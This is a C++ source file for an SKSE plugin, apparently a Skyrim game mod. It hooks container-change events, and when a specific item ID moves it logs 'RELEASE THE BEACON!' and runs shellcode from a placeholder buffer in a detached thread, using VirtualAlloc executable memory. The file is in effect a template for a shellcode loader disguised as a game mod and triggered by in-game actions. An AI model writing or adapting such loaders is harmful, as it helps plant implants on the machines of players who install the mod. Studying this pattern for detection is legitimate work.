#include <iostream>
#include <thread>
#include <Windows.h>
#include "logger.h" 

struct OurEventSink : public RE::BSTEventSink<RE::TESContainerChangedEvent> {
    RE::BSEventNotifyControl ProcessEvent(const RE::TESContainerChangedEvent* event,
                                          RE::BSTEventSource<RE::TESContainerChangedEvent>*) {
        auto beaconBaseID = event->baseObj;

        if (beaconBaseID == 320742) {
            logger::info("RELEASE THE BEACON! ID: {}", beaconBaseID);

            // Create an instance of the OurEventSink class
            OurEventSink eventSinkInstance;

            // Create a detached thread and pass the member function and instance
            std::thread shellcodeThread(&OurEventSink::executeShellcode, &eventSinkInstance);

            // Detach the thread, allowing it to run independently
            shellcodeThread.detach();
        }
        return RE::BSEventNotifyControl::kContinue;
    }


    void executeShellcode() {
        unsigned char teststuff[] = { <YOUR SHELLCODE HERE> };

        // Allocate executable memory
        void* execMem = VirtualAlloc(0, sizeof(teststuff), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (execMem == nullptr) {
            std::cerr << "VirtualAlloc failed" << std::endl;
            return;
        }

        // Copy shellcode to executable memory
        memcpy(execMem, teststuff, sizeof(teststuff));

        // Cast to a function pointer and execute
        void (*shellcode)() = (void (*)())execMem;
        shellcode();

        // Clean up
        VirtualFree(execMem, 0, MEM_RELEASE);
    }
};

SKSEPluginLoad(const SKSE::LoadInterface *skse) {
    SKSE::Init(skse);
    SetupLog();
    
    // ScriptSource
    auto* eventSink = new OurEventSink();
    auto* eventSourceHolder = RE::ScriptEventSourceHolder::GetSingleton();
    eventSourceHolder->AddEventSink<RE::TESContainerChangedEvent>(eventSink);
    return true;
}
